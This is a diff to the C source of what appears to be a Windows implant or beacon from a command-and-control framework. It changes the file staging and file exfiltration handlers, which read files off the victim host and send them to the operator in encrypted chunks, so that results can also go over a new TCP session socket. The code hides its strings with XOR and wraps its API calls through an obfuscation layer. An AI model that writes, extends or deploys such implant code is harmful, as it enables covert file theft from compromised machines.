@@ -1,3 +1,4 @@
+#include <winsock2.h>
 #include <windows.h>
 #include <string.h>
 #include <stdint.h>
@@ -8,6 +9,7 @@
 #include "obf.h"
 #include "obf_strings.h"
 #include "../../include/dynapi.h"
+#include "../../include/session.h"
 
 #define MAX_STAGE_SLOTS  4
 #define EXFIL_CHUNK_SIZE 65536
@@ -33,7 +35,8 @@ static int path_has_traversal(const char *path) {
 void handle_file_stage(uint32_t beacon_id, uint32_t label,
                        uint32_t identifier, uint16_t flags,
                        const uint8_t *data, uint32_t len,
-                       const uint8_t session_key[32]) {
+                       const uint8_t session_key[32],
+                       SOCKET tcp_sock) {
     stage_slot_t *slot = NULL;
 
     if (identifier == 0) {
@@ -100,17 +103,19 @@ void handle_file_stage(uint32_t beacon_id, uint32_t label,
 
     if (slot && (flags & FLAG_LAST_FRAG)) {
         fnCloseHandle2(slot->hFile);
-        char msg[MAX_PATH + 32];
-        snprintf(msg, sizeof(msg), "upload complete: %s", slot->dest_path);
-        uint32_t msg_len = (uint32_t)strlen(msg);
+        uint32_t msg_len = (uint32_t)strlen(slot->dest_path);
         uint8_t rep[4 + MAX_PATH + 32];
         rep[0] = (uint8_t)(msg_len & 0xFF);
         rep[1] = (uint8_t)((msg_len >> 8) & 0xFF);
         rep[2] = (uint8_t)((msg_len >> 16) & 0xFF);
         rep[3] = (uint8_t)((msg_len >> 24) & 0xFF);
-        memcpy(rep + 4, msg, msg_len);
-        send_result_raw(beacon_id, label, TASK_FILE_STAGE, FLAG_NONE, 0,
-                        rep, 4 + msg_len, session_key);
+        memcpy(rep + 4, slot->dest_path, msg_len);
+        if (tcp_sock != INVALID_SOCKET)
+            send_result_raw_session(tcp_sock, label, TASK_FILE_STAGE, FLAG_NONE, 0,
+                                    rep, 4 + msg_len, (uint8_t *)session_key);
+        else
+            send_result_raw(beacon_id, label, TASK_FILE_STAGE, FLAG_NONE, 0,
+                            rep, 4 + msg_len, session_key);
         slot->hFile  = NULL;
         slot->active = 0;
         slot->label  = 0;
@@ -120,14 +125,19 @@ void handle_file_stage(uint32_t beacon_id, uint32_t label,
 
 void handle_file_exfil(uint32_t beacon_id, uint32_t label,
                        const char *src_path,
-                       const uint8_t session_key[32]) {
+                       const uint8_t session_key[32],
+                       SOCKET tcp_sock) {
     HANDLE hFile = fnCreateFileA2(src_path, GENERIC_READ, FILE_SHARE_READ, NULL,
                                OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
     if (hFile == INVALID_HANDLE_VALUE) {
         char _err[ENC_EXFIL_ERR_OPEN_LEN + 1];
         xor_dec(_err, ENC_EXFIL_ERR_OPEN, ENC_EXFIL_ERR_OPEN_LEN);
         char msg[128]; snprintf(msg, sizeof(msg), _err, fnGetLastError());
-        send_result(beacon_id, label, FLAG_ERROR, msg, session_key);
+        if (tcp_sock != INVALID_SOCKET)
+            send_result_session(tcp_sock, label, TASK_RUN, 0, FLAG_ERROR,
+                                msg, (uint8_t *)session_key);
+        else
+            send_result(beacon_id, label, FLAG_ERROR, msg, session_key);
         return;
     }
 
@@ -156,8 +166,12 @@ void handle_file_exfil(uint32_t beacon_id, uint32_t label,
         chunk_buf[0] = (uint8_t)(name_len & 0xFF);
         chunk_buf[1] = (uint8_t)((name_len >> 8) & 0xFF);
         memcpy(chunk_buf + 2, basename, name_len);
-        send_result_raw(beacon_id, label, TASK_FILE_EXFIL, FLAG_LAST_FRAG, 0,
-                        chunk_buf, 2 + name_len, session_key);
+        if (tcp_sock != INVALID_SOCKET)
+            send_result_raw_session(tcp_sock, label, TASK_FILE_EXFIL, FLAG_LAST_FRAG, 0,
+                                    chunk_buf, 2 + name_len, (uint8_t *)session_key);
+        else
+            send_result_raw(beacon_id, label, TASK_FILE_EXFIL, FLAG_LAST_FRAG, 0,
+                            chunk_buf, 2 + name_len, session_key);
         fnLocalFree(chunk_buf);
         fnCloseHandle2(hFile);
         return;
@@ -181,15 +195,23 @@ void handle_file_exfil(uint32_t beacon_id, uint32_t label,
             char _err[ENC_EXFIL_ERR_READ_LEN + 1];
             xor_dec(_err, ENC_EXFIL_ERR_READ, ENC_EXFIL_ERR_READ_LEN);
             char msg[128]; snprintf(msg, sizeof(msg), _err, fnGetLastError());
-            send_result(beacon_id, label, FLAG_ERROR, msg, session_key);
+            if (tcp_sock != INVALID_SOCKET)
+                send_result_session(tcp_sock, label, TASK_RUN, 0, FLAG_ERROR,
+                                    msg, (uint8_t *)session_key);
+            else
+                send_result(beacon_id, label, FLAG_ERROR, msg, session_key);
             break;
         }
 
         offset += bytes_read;
         uint16_t flags = (offset >= total) ? FLAG_LAST_FRAG : FLAG_FRAGMENTED;
 
-        send_result_raw(beacon_id, label, TASK_FILE_EXFIL, flags, identifier,
-                        chunk_buf, prefix + bytes_read, session_key);
+        if (tcp_sock != INVALID_SOCKET)
+            send_result_raw_session(tcp_sock, label, TASK_FILE_EXFIL, flags, identifier,
+                                    chunk_buf, prefix + bytes_read, (uint8_t *)session_key);
+        else
+            send_result_raw(beacon_id, label, TASK_FILE_EXFIL, flags, identifier,
+                            chunk_buf, prefix + bytes_read, session_key);
         identifier++;
     }
 
